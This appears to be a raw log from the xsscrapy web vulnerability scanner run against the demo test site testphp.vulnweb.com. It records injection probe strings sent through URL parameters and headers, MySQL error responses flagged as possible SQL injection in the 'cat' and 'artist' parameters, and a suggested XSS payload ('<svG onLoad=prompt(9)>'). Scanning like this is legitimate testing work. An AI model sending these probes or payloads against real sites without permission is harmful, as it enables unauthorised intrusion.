+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=5> (referer: http://testphp.vulnweb.com/product.php?pic=5)
+2022-06-21 14:33:16 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/showimage.php/1zqjci'%22()%7B%7D%3Cx%3E:1zqjci;9/?file=./pictures/4.jpg>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:16 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg
+2022-06-21 14:33:16 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/showimage.php?file=1zqjio'%22()%7B%7D%3Cx%3E:/1zqjio;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/;
+2022-06-21 14:33:16 [xsscrapy] INFO:     Payload: 1zqjio'"(){}<x>:/1zqjio;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:16 [xsscrapy] INFO:     Injectiepunten: file
+2022-06-21 14:33:16 [xsscrapy] INFO:     Mogelijke payloads: <svG onLoad=prompt(9)>
+2022-06-21 14:33:16 [xsscrapy] INFO:     Line: <p
+warning: fopen(1zqjio'"(){}<x>:/1zqjio;9
+2022-06-21 14:33:16 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/showimage.php?file=1zqjio'%22()%7B%7D%3Cx%3E:/1zqjio;9>
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg. type = header, Referer
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg. type = header, cookie
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/product.php?pic=5> (referer: 1zqjlr'"(){}<x>:/1zqjlr;9)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=1zqjbx'%22()%7B%7D%3Cx%3E:/1zqjbx;9> (referer: http://testphp.vulnweb.com/listproducts.php?cat=4)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=4> (referer: http://testphp.vulnweb.com/listproducts.php?cat=4)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?cat=4> (referer: 1zqjta'"(){}<x>:/1zqjta;9)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <POST http://testphp.vulnweb.com/secured/newuser.php> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=5. type = header, cookie
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/signup.php> (referer: http://testphp.vulnweb.com/signup.php)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/signup.php> (referer: 1zqjax'"(){}<x>:/1zqjax;9)
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/product.php?pic=5. type = header, Referer
+
+
+2022-06-21 14:33:16 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?cat=4
+2022-06-21 14:33:16 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjbx'%22()%7B%7D%3Cx%3E:/1zqjbx;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:16 [xsscrapy] INFO:     Payload: 1zqjbx'"(){}<x>:/1zqjbx;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:16 [xsscrapy] INFO:     Injectiepunten: cat
+2022-06-21 14:33:16 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: SQL syntax.*MySQL
+2022-06-21 14:33:16 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?cat=4
+2022-06-21 14:33:16 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?cat=1zqjbx'%22()%7B%7D%3Cx%3E:/1zqjbx;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/
+2022-06-21 14:33:16 [xsscrapy] INFO:     Payload: 1zqjbx'"(){}<x>:/1zqjbx;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:16 [xsscrapy] INFO:     Injectiepunten: cat
+2022-06-21 14:33:16 [xsscrapy] INFO:     Line: 	error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ''"(){}<x>:/1zqjbx;9' at line 1
+2022-06-21 14:33:16 [xsscrapy] INFO:     Fout: Payload delims do not surround this injection point. Found via search for entire payload.
+2022-06-21 14:33:16 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/listproducts.php?cat=1zqjbx'%22()%7B%7D%3Cx%3E:/1zqjbx;9>
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/categories.php> (referer: 1zqjhe'"(){}<x>:/1zqjhe;9)
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?cat=4. type = header, cookie
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?cat=4. type = header, Referer
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/secured/newuser.php. type = form, uuname
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/signup.php. type = header, cookie
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/signup.php. type = header, Referer
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=3> (referer: http://testphp.vulnweb.com/artists.php)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=2> (referer: http://testphp.vulnweb.com/artists.php)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=1> (referer: http://testphp.vulnweb.com/artists.php)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/artists.php/1zqjod'%22()%7B%7D%3Cx%3E:1zqjod;9> (referer: http://testphp.vulnweb.com/artists.php)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php> (referer: http://testphp.vulnweb.com/artists.php)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php> (referer: 1zqjmc'"(){}<x>:/1zqjmc;9)
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/categories.php. type = header, Referer
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (302) <POST http://testphp.vulnweb.com/userinfo.php> (referer: http://testphp.vulnweb.com/login.php)
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/artists.php/1zqjfl'%22()%7B%7D%3Cx%3E:1zqjfl;9/?artist=2
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/artists.php?artist=1zqjva'%22()%7B%7D%3Cx%3E:/1zqjva;9
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/artists.php/1zqjhi'%22()%7B%7D%3Cx%3E:1zqjhi;9/?artist=3
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/artists.php?artist=1zqjec'%22()%7B%7D%3Cx%3E:/1zqjec;9
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/login.php> (referer: http://testphp.vulnweb.com/login.php)
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/artists.php/1zqjyr'%22()%7B%7D%3Cx%3E:1zqjyr;9/?artist=1
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/artists.php?artist=1zqjcn'%22()%7B%7D%3Cx%3E:/1zqjcn;9
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:16 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/artists.php/1zqjod'%22()%7B%7D%3Cx%3E:1zqjod;9>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php. type = header, cookie
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php. type = header, Referer
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/login.php> (referer: 1zqjjk'"(){}<x>:/1zqjjk;9)
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/userinfo.php. type = form, uname
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/cart.php> (referer: 1zqjhc'"(){}<x>:/1zqjhc;9)
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/login.php. type = header, cookie
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/login.php. type = header, Referer
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=1zqjva'%22()%7B%7D%3Cx%3E:/1zqjva;9> (referer: http://testphp.vulnweb.com/artists.php?artist=2)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=2> (referer: http://testphp.vulnweb.com/artists.php?artist=2)
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/cart.php. type = header, Referer
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/artists.php/1zqjfl'%22()%7B%7D%3Cx%3E:1zqjfl;9/?artist=2> (referer: http://testphp.vulnweb.com/artists.php?artist=2)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=2> (referer: 1zqjmg'"(){}<x>:/1zqjmg;9)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=3> (referer: http://testphp.vulnweb.com/artists.php?artist=3)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=2> (referer: http://testphp.vulnweb.com/artists.php?artist=2)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/artists.php/1zqjhi'%22()%7B%7D%3Cx%3E:1zqjhi;9/?artist=3> (referer: http://testphp.vulnweb.com/artists.php?artist=3)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=1zqjec'%22()%7B%7D%3Cx%3E:/1zqjec;9> (referer: http://testphp.vulnweb.com/artists.php?artist=3)
+2022-06-21 14:33:16 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/artists.php/1zqjfl'%22()%7B%7D%3Cx%3E:1zqjfl;9/?artist=2>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:16 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/artists.php?artist=2
+2022-06-21 14:33:16 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/artists.php?artist=1zqjva'%22()%7B%7D%3Cx%3E:/1zqjva;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:16 [xsscrapy] INFO:     Payload: 1zqjva'"(){}<x>:/1zqjva;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:16 [xsscrapy] INFO:     Injectiepunten: artist
+2022-06-21 14:33:16 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php?artist=1zqjva'%22()%7B%7D%3Cx%3E:/1zqjva;9. type = url, artist
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php?artist=2. type = header, cookie
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php?artist=2. type = header, Referer
+
+
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php/1zqjyo'%22()%7B%7D%3Cx%3E:1zqjyo;9/?artist=3
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php?artist=1zqjsk'%22()%7B%7D%3Cx%3E:/1zqjsk;9
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php/1zqjyi'%22()%7B%7D%3Cx%3E:1zqjyi;9/?artist=2
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php?artist=1zqjmg'%22()%7B%7D%3Cx%3E:/1zqjmg;9
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:16 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/artists.php/1zqjhi'%22()%7B%7D%3Cx%3E:1zqjhi;9/?artist=3>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=3> (referer: http://testphp.vulnweb.com/artists.php?artist=3)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=3> (referer: 1zqjnm'"(){}<x>:/1zqjnm;9)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=1> (referer: http://testphp.vulnweb.com/artists.php?artist=1)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/artists.php/1zqjyr'%22()%7B%7D%3Cx%3E:1zqjyr;9/?artist=1> (referer: http://testphp.vulnweb.com/artists.php?artist=1)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=1zqjcn'%22()%7B%7D%3Cx%3E:/1zqjcn;9> (referer: http://testphp.vulnweb.com/artists.php?artist=1)
+2022-06-21 14:33:16 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/artists.php?artist=3
+2022-06-21 14:33:16 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/artists.php?artist=1zqjec'%22()%7B%7D%3Cx%3E:/1zqjec;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:16 [xsscrapy] INFO:     Payload: 1zqjec'"(){}<x>:/1zqjec;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:16 [xsscrapy] INFO:     Injectiepunten: artist
+2022-06-21 14:33:16 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php?artist=1zqjec'%22()%7B%7D%3Cx%3E:/1zqjec;9. type = url, artist
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=1> (referer: http://testphp.vulnweb.com/artists.php?artist=1)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/artists.php?artist=1> (referer: 1zqjmi'"(){}<x>:/1zqjmi;9)
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php?artist=3. type = header, cookie
+
+
+2022-06-21 14:33:16 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/artists.php/1zqjyr'%22()%7B%7D%3Cx%3E:1zqjyr;9/?artist=1>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php?artist=3. type = header, Referer
+
+
+2022-06-21 14:33:16 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/artists.php?artist=1
+2022-06-21 14:33:16 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/artists.php?artist=1zqjcn'%22()%7B%7D%3Cx%3E:/1zqjcn;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:16 [xsscrapy] INFO:     Payload: 1zqjcn'"(){}<x>:/1zqjcn;9
+2022-06-21 14:33:16 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:16 [xsscrapy] INFO:     Injectiepunten: artist
+2022-06-21 14:33:16 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: Warning.*mysql_.*
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php?artist=1zqjcn'%22()%7B%7D%3Cx%3E:/1zqjcn;9. type = url, artist
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/listproducts.php/1zqjyo'%22()%7B%7D%3Cx%3E:1zqjyo;9/?artist=3> (referer: http://testphp.vulnweb.com/listproducts.php?artist=3)
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php/1zqjli'%22()%7B%7D%3Cx%3E:1zqjli;9/?artist=1
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded URL: http://testphp.vulnweb.com/listproducts.php?artist=1zqjzv'%22()%7B%7D%3Cx%3E:/1zqjzv;9
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded cookie header
+2022-06-21 14:33:16 [xsscrapy] DEBUG: Sending payloaded Referer header
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php?artist=1. type = header, cookie
+
+
+2022-06-21 14:33:16 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/artists.php?artist=1. type = header, Referer
+
+
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=1zqjsk'%22()%7B%7D%3Cx%3E:/1zqjsk;9> (referer: http://testphp.vulnweb.com/listproducts.php?artist=3)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=2> (referer: 1zqjfk'"(){}<x>:/1zqjfk;9)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=3> (referer: http://testphp.vulnweb.com/listproducts.php?artist=3)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=1zqjmg'%22()%7B%7D%3Cx%3E:/1zqjmg;9> (referer: http://testphp.vulnweb.com/listproducts.php?artist=2)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=3> (referer: 1zqjkg'"(){}<x>:/1zqjkg;9)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/listproducts.php/1zqjyi'%22()%7B%7D%3Cx%3E:1zqjyi;9/?artist=2> (referer: http://testphp.vulnweb.com/listproducts.php?artist=2)
+2022-06-21 14:33:16 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=2> (referer: http://testphp.vulnweb.com/listproducts.php?artist=2)
+2022-06-21 14:33:17 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/listproducts.php/1zqjyo'%22()%7B%7D%3Cx%3E:1zqjyo;9/?artist=3>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:17 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?artist=3
+2022-06-21 14:33:17 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?artist=1zqjsk'%22()%7B%7D%3Cx%3E:/1zqjsk;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:17 [xsscrapy] INFO:     Payload: 1zqjsk'"(){}<x>:/1zqjsk;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:17 [xsscrapy] INFO:     Injectiepunten: artist
+2022-06-21 14:33:17 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: SQL syntax.*MySQL
+2022-06-21 14:33:17 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?artist=3
+2022-06-21 14:33:17 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?artist=1zqjsk'%22()%7B%7D%3Cx%3E:/1zqjsk;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/
+2022-06-21 14:33:17 [xsscrapy] INFO:     Payload: 1zqjsk'"(){}<x>:/1zqjsk;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:17 [xsscrapy] INFO:     Injectiepunten: artist
+2022-06-21 14:33:17 [xsscrapy] INFO:     Line: 	error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ''"(){}<x>:/1zqjsk;9' at line 1
+2022-06-21 14:33:17 [xsscrapy] INFO:     Fout: Payload delims do not surround this injection point. Found via search for entire payload.
+2022-06-21 14:33:17 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/listproducts.php?artist=1zqjsk'%22()%7B%7D%3Cx%3E:/1zqjsk;9>
+
+
+2022-06-21 14:33:17 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?artist=2. type = header, Referer
+
+
+2022-06-21 14:33:17 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?artist=3. type = header, cookie
+
+
+2022-06-21 14:33:17 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/listproducts.php/1zqjyi'%22()%7B%7D%3Cx%3E:1zqjyi;9/?artist=2>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:17 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?artist=2
+2022-06-21 14:33:17 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?artist=1zqjmg'%22()%7B%7D%3Cx%3E:/1zqjmg;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:17 [xsscrapy] INFO:     Payload: 1zqjmg'"(){}<x>:/1zqjmg;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:17 [xsscrapy] INFO:     Injectiepunten: artist
+2022-06-21 14:33:17 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: SQL syntax.*MySQL
+2022-06-21 14:33:17 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?artist=2
+2022-06-21 14:33:17 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?artist=1zqjmg'%22()%7B%7D%3Cx%3E:/1zqjmg;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/
+2022-06-21 14:33:17 [xsscrapy] INFO:     Payload: 1zqjmg'"(){}<x>:/1zqjmg;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:17 [xsscrapy] INFO:     Injectiepunten: artist
+2022-06-21 14:33:17 [xsscrapy] INFO:     Line: 	error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ''"(){}<x>:/1zqjmg;9' at line 1
+2022-06-21 14:33:17 [xsscrapy] INFO:     Fout: Payload delims do not surround this injection point. Found via search for entire payload.
+2022-06-21 14:33:17 [scrapy.core.scraper] DEBUG: Scraped from <200 http://testphp.vulnweb.com/listproducts.php?artist=1zqjmg'%22()%7B%7D%3Cx%3E:/1zqjmg;9>
+
+
+2022-06-21 14:33:17 [scrapy.core.engine] DEBUG: Crawled (404) <GET http://testphp.vulnweb.com/listproducts.php/1zqjli'%22()%7B%7D%3Cx%3E:1zqjli;9/?artist=1> (referer: http://testphp.vulnweb.com/listproducts.php?artist=1)
+2022-06-21 14:33:17 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?artist=3. type = header, Referer
+
+
+2022-06-21 14:33:17 [scrapy.core.scraper] WARNING: Dropped: No XSS vulns in http://testphp.vulnweb.com/listproducts.php?artist=2. type = header, cookie
+
+
+2022-06-21 14:33:17 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=1zqjzv'%22()%7B%7D%3Cx%3E:/1zqjzv;9> (referer: http://testphp.vulnweb.com/listproducts.php?artist=1)
+2022-06-21 14:33:17 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=1> (referer: http://testphp.vulnweb.com/listproducts.php?artist=1)
+2022-06-21 14:33:17 [scrapy.core.engine] DEBUG: Crawled (200) <GET http://testphp.vulnweb.com/listproducts.php?artist=1> (referer: 1zqjyk'"(){}<x>:/1zqjyk;9)
+2022-06-21 14:33:17 [scrapy.spidermiddlewares.httperror] INFO: Ignoring response <404 http://testphp.vulnweb.com/listproducts.php/1zqjli'%22()%7B%7D%3Cx%3E:1zqjli;9/?artist=1>: HTTP status code is not handled or not allowed
+2022-06-21 14:33:17 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?artist=1
+2022-06-21 14:33:17 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?artist=1zqjzv'%22()%7B%7D%3Cx%3E:/1zqjzv;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Ongefilterde tekens: N/A
+2022-06-21 14:33:17 [xsscrapy] INFO:     Payload: 1zqjzv'"(){}<x>:/1zqjzv;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Type: url
+2022-06-21 14:33:17 [xsscrapy] INFO:     Injectiepunten: artist
+2022-06-21 14:33:17 [xsscrapy] INFO:     Line: Possible SQL injection error! Suspected DBMS: MySQL, regex used: SQL syntax.*MySQL
+2022-06-21 14:33:17 [xsscrapy] INFO:     URL: http://testphp.vulnweb.com/listproducts.php?artist=1
+2022-06-21 14:33:17 [xsscrapy] INFO:     Response URL: http://testphp.vulnweb.com/listproducts.php?artist=1zqjzv'%22()%7B%7D%3Cx%3E:/1zqjzv;9
+2022-06-21 14:33:17 [xsscrapy] INFO:     Ongefilterde tekens: '"(){}<x>:/
+2022-06-21 14:33:17 [xsscrapy] INFO:     Payload: 1zqjzv'"(){}<x>:/1zqjzv;9
